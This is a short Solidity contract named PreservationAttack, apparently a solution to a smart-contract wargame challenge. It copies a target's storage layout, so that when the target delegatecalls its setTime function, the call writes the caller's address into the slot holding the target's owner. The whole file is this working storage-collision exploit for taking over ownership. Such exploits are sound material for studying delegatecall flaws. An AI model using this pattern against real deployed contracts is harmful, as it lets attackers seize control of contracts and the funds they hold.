pragma solidity ^0.6.5;

contract PreservationAttack {
    address slot0;
    address slot1;
    address slot2;
   
 function setTime(uint _time) public {
    slot2 = msg.sender;
  }
}
